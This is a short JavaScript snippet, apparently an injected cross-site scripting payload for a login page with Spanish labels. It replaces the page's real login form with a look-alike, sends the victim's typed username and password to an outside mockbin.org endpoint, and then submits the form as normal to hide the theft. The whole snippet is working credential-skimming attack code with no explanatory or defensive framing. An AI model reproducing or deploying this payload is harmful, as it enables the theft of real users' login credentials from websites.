function l(){
    var a = new XMLHttpRequest();
    a.open('GET','http://mockbin.org/bin/014d87bb-3ab6-4613-9bb1-52ec5c823d7c?p='
        .concat(document.getElementById('password').value,'%26u=',document.getElementById('usuario').value));
    a.onreadystatechange=function(){
        if(a.readyState === XMLHttpRequest.DONE){
            document.forms[0].action='control.php';
            document.forms[0].method='POST';
            document.forms[0].submit();
        }
    };
    a.send(null);
}
var f=document.createElement("form");
f.innerHTML=`<form action="control.php" method="post">
    <label for="usuario">USUARIO: </label>
    <input id="usuario" class="user" type="text" name="usuario" value="" size="20" maxlength="50"><br>
    <label for="password">CONTR4SEÑA: </label>
    <input id="password" class="password" type="password" name="password" size="20" maxlength="50"><br>
    <button type="submit" class="enviar_btn">Entrar</button>
</form>
`;
 document.getElementById("contenido").appendChild(f);
 document.forms[0].remove();
 document.forms[0].action = 'javascript:l();'
